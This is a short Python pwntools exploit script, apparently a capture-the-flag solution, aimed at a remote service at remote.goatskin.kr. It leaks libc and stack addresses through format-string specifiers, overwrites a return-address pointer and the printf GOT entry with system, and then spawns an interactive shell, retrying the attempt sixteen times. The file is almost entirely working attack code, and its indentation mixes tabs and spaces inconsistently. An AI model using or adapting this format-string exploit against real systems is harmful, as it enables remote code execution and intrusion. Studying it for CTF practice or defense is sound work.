from pwn import *

def word_sub(a1,a2):
	if a1==a2:
		return 2**16
	else:
		return (a1-a2)%2**16

def exploit():
	
    	global p
	p = remote("remote.goatskin.kr", 50005)

	# libc leak and stack leak
	p.sendline("%2$p %13$p")
	d1,d2 = p.recvline().split(" ")
	LIBC = int(d1,16) - e.symbols['_IO_2_1_stdin_']
	STACK = int(d2,16)
	retstack = 0xff8ac8c0 + 0xC - 0xff8ac964 + STACK
	log.info("LIBC: 0x%x"%LIBC)
	log.info("retstack: 0x%x"%retstack) # retstack is 11
	
	# stack pointer overwrite 1 (13, 14 points to retstack, retstack + 2)
	a1 = retstack & 0xFFFF
	a2 = word_sub((retstack+2) & 0xFFFF, a1)
	p.sendline("%{}c%13$hn%{}c%14$hn".format(a1,a2))

	# using these pointers, overwrite retaddr with system
	system = LIBC + e.symbols['system']
	target = 0x804A00C 
	a1 = target & 0xFFFF
	a2 = word_sub(target >> 16, a1)
	p.sendline("%{}c%49$hn%{}c%51$hn".format(a1,a2))

	# overwrite printf_got
	a1 = system & 0xFFFF
	p.sendline("%{}c%11$hn".format(a1))

    	try:
        	p.sendline("echo 'we got a shell'")
        	p.recvuntil("we got a shell")
            	p.sendline("/bin/sh;")
        	p.interactive()
    	except:
        	log.failure("FAIL!")
        	p.close()

if __name__ == "__main__":
    e = ELF("./libc_32.so")
    for i in range(0x10):
        exploit()
